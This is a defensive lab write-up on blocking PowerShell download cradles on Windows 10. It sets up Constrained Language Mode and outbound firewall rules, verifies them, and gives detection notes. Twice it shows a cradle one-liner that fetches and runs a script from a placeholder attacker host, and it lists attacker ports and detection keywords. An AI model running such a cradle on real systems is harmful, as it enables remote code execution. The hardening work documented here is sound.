# Technique 03 — Download Cradle (Fileless Execution)
## Lab Documentation | Windows 10 Pro
**MITRE:** T1059.001 / T1105 | **Severity:** Critical | **Status:** Fully Mitigated

---

## What This Attack Does

A download cradle fetches a malicious script directly from the internet and
immediately executes it in memory using `Invoke-Expression` (IEX). The critical
danger is that **no file ever touches disk**. Traditional antivirus scans files
— there is nothing to scan.

The classic one-liner:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

Two components make this work:
- `New-Object Net.WebClient` — PowerShell's built-in HTTP client, fetches any
  URL as a string directly into memory
- `IEX` (Invoke-Expression) — executes that string as PowerShell code immediately

The entire attack happens in RAM. Even after reboot, the only evidence may be
network logs and PowerShell Script Block Logging (Event 4104).

---

## Why This Technique Is The Most Important Fix In The Project

Constrained Language Mode (CLM) — the fix for this technique — simultaneously
neutralises four techniques by removing the .NET types they depend on:

| Technique | What CLM Removes | Result |
|-----------|-----------------|--------|
| T03 — Download Cradle | `Net.WebClient` | Cannot fetch URLs |
| T04 — AMSI Bypass | `.NET reflection` | Cannot patch amsiInitFailed |
| T05 — Reverse Shell | `TCPClient` | Cannot open socket |
| T08 — Fileless Registry | `FromBase64String` in execution | Cannot decode payload |

**One environment variable. Four techniques neutralised.**

---

## Before — Attack Works (Baseline)

### Test 1 — Confirm Net.WebClient can be created

Command run (normal PowerShell, no admin):
```powershell
$wc = New-Object Net.WebClient
Write-Host "Net.WebClient created: $($wc.GetType().Name)"
```

Result:
```
Net.WebClient created: WebClient
```

The attack vector is fully open. An attacker can call `.DownloadString()` on
this object to fetch any script from any URL and execute it in memory.

![Before — Net.WebClient created successfully](screenshots/T03/01_before_webclient_created.png)

### Test 2 — Confirm IEX is available

Command run:
```powershell
IEX "Write-Host 'IEX is available — cradle would work'"
```

Result:
```
IEX is available — cradle would work
```

Both building blocks of the download cradle are freely available.

![Before — IEX available and executing](screenshots/T03/02_before_iex_available.png)

---

## The Fix — Two Defence Layers

### Why two layers?

```
Layer 1 — CLM:      blocks the object creation (Net.WebClient cannot be constructed)
Layer 2 — Firewall: blocks the network call (even if CLM is bypassed, no outbound connection)

Defence in depth — both must fail for the attack to succeed.
```

---

## Layer 1 — Constrained Language Mode via __PSLockdownPolicy

Open PowerShell as Administrator:

```powershell
[System.Environment]::SetEnvironmentVariable(
  "__PSLockdownPolicy",
  "4",
  [System.EnvironmentVariableTarget]::Machine
)
```

Verify it was written:
```powershell
[System.Environment]::GetEnvironmentVariable("__PSLockdownPolicy", "Machine")
```

Expected output: `4`

**What this does:** Creates a system-wide environment variable called
`__PSLockdownPolicy` with value `4`. PowerShell checks this variable at
session startup. When it equals `4`, PowerShell enters Constrained Language
Mode for every session on the machine, for every user including administrators.

CLM restricts PowerShell to core types only — removing `Net.WebClient`,
`TCPClient`, `.NET reflection`, and `FromBase64String` in execution context.
These are the exact .NET types that power techniques T03, T04, T05, and T08.

**Critical:** CLM is read at session startup. Close every PowerShell window
after running this command — existing sessions will never enter CLM.

![Layer 1 — __PSLockdownPolicy = 4 written and verified](screenshots/T03/03_clm_env_var_set.png)

---

## Layer 2 — Firewall Rules Blocking PowerShell Outbound

Open a new admin PowerShell and run all three rules:

```powershell
New-NetFirewallRule `
  -DisplayName "BLOCK - PowerShell.exe Outbound" `
  -Direction Outbound `
  -Program "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
  -Action Block -Profile Any -Enabled True
```

```powershell
New-NetFirewallRule `
  -DisplayName "BLOCK - PowerShell_ISE.exe Outbound" `
  -Direction Outbound `
  -Program "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell_ise.exe" `
  -Action Block -Profile Any -Enabled True
```

```powershell
New-NetFirewallRule `
  -DisplayName "BLOCK - Common Attacker Ports Outbound" `
  -Direction Outbound `
  -Protocol TCP `
  -RemotePort 4444,4445,1234,8080,8443,9001,9999,1337,31337 `
  -Action Block -Profile Any -Enabled True
```

Each rule returns a property block confirming creation with `Status: OK`.

![Layer 2 — all three firewall rules created](screenshots/T03/04_firewall_rules_created.png)

---

## After — Verification

Close all PowerShell windows. Open a fresh **normal PowerShell (not admin)**.

### Test 1 — Confirm CLM is active

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Result: `ConstrainedLanguage`

![Verification — ConstrainedLanguage confirmed](screenshots/T03/05_clm_confirmed.png)

### Test 2 — Try to create Net.WebClient (should fail)

```powershell
New-Object Net.WebClient
```

Result:
```
New-Object : Cannot create type. Only core types are supported in this language mode.
+ CategoryInfo: PermissionDenied: (:) [New-Object], PSNotSupportedException
+ FullyQualifiedErrorId: CannotCreateTypeConstrainedLanguage
```

The attack fails at object creation — before any network connection is
even attempted. The download cradle cannot be constructed.

![Verification — Net.WebClient blocked by CLM](screenshots/T03/06_webclient_blocked.png)

### Test 3 — Try the full download cradle

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

Result:
```
New-Object : Cannot create type. Only core types are supported in this language mode.
```

IEX never receives anything to execute — the WebClient object is blocked
before the download can begin. The attack chain is broken at step one.

### Test 4 — Confirm firewall rules (run as admin)

```powershell
Get-NetFirewallRule | Where-Object { $_.DisplayName -like "BLOCK*" } |
  Select-Object DisplayName, Enabled, Action
```

Result:
```
DisplayName                              Enabled  Action
-----------                              -------  ------
BLOCK - PowerShell.exe Outbound          True     Block
BLOCK - PowerShell_ISE.exe Outbound      True     Block
BLOCK - Common Attacker Ports Outbound   True     Block
```

Note: running `Get-NetFirewallRule` from a standard user session under CLM
returns `Access is denied` — this is expected behaviour. Run from an
elevated session to confirm the rules.

![Verification — all three firewall rules confirmed active](screenshots/T03/07_firewall_rules_verified.png)

---

## Key Learning — IEX Behaviour in CLM

During testing, `IEX "Write-Host 'test'"` appeared to still work under CLM.
This is expected and correct — CLM does not remove IEX entirely.

What CLM does is restrict **what IEX can receive and execute**:
- `IEX "Write-Host 'test'"` works — `Write-Host` is a core cmdlet
- `IEX (New-Object Net.WebClient)...` fails — `Net.WebClient` is not a core type

The download cradle fails because `Net.WebClient` cannot be constructed.
IEX never gets anything to execute. The attack is broken upstream of IEX,
not at IEX itself.

```
Attack chain:
  New-Object Net.WebClient  ← BLOCKED HERE by CLM
        ↓
  .DownloadString(url)      ← never reached
        ↓
  IEX executes payload      ← never reached
```

---

## Lab Notes — Issues Encountered

### Get-NetFirewallRule access denied from standard user session

**What happened:** Running `Get-NetFirewallRule` from a normal user PowerShell
session under CLM returned `Access is denied`.

**Root cause:** `Get-NetFirewallRule` uses CIM/WMI which requires admin
privileges. CLM in a standard user session restricts CIM access.

**Resolution:** Run from an elevated admin PowerShell session — confirmed
all three rules present and active.

**Lesson:** Some verification commands require admin rights. This does not
mean the fix failed — it means you need to use the right session for the
right verification command.

---

## Registry / System Values Written

| Type | Location | Name | Value |
|------|----------|------|-------|
| Environment Variable | Machine | `__PSLockdownPolicy` | `4` |
| Firewall Rule | Windows Firewall | BLOCK - PowerShell.exe Outbound | Enabled |
| Firewall Rule | Windows Firewall | BLOCK - PowerShell_ISE.exe Outbound | Enabled |
| Firewall Rule | Windows Firewall | BLOCK - Common Attacker Ports Outbound | Enabled |

---

## What T03 Fix Also Solves (Forward Reference)

| Technique | Protected By T03 Fix | Additional Steps Needed |
|-----------|---------------------|------------------------|
| T04 — AMSI Bypass | CLM blocks .NET reflection | Defender registry lock |
| T05 — Reverse Shell | CLM blocks TCPClient + firewall blocks ports | Audit logging |
| T08 — Fileless Registry | CLM blocks FromBase64String chain | Registry auditing |

---

## SOC Threat Hunting Notes

**Event 4104** (Script Block Logging — enabled in T02) captures downloaded
script content before execution. Even if the cradle somehow runs, the
downloaded payload appears in the log.

**Network indicators:** DNS queries to unknown domains from endpoints where
PowerShell should have no internet access. Outbound connections from
`powershell.exe` on any port.

**Splunk detection query (future implementation):**
```
source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
EventCode=4104
(ScriptBlockText="*Net.WebClient*" OR ScriptBlockText="*DownloadString*"
OR ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*"
OR ScriptBlockText="*iwr*" OR ScriptBlockText="*Invoke-RestMethod*")
```

---

## MITRE ATT&CK Mapping

| Field | Value |
|-------|-------|
| Technique | T1059.001 — Command and Scripting Interpreter: PowerShell |
| Technique | T1105 — Ingress Tool Transfer |
| Tactic | Execution, Command and Control |
| Detection | Event ID 4104 (downloaded script content) |
| Detection | Event ID 4688 (process creation with suspicious args) |
| Detection | Event ID 5157 (outbound connection blocked by firewall) |
| Reference | https://attack.mitre.org/techniques/T1059/001/ |
| Reference | https://attack.mitre.org/techniques/T1105/ |

---

## Screenshot Folder Structure

```
evidence/
└── T03/
    ├── 01_before_webclient_created.png
    ├── 02_before_iex_available.png
    ├── 03_clm_env_var_set.png
    ├── 04_firewall_rules_created.png
    ├── 05_clm_confirmed.png
    ├── 06_webclient_blocked.png
    └── 07_firewall_rules_verified.png
```

---

*Lab environment: Windows 10 Pro · VMware · Standalone VM · No Domain*
*Date: [date of lab session]*
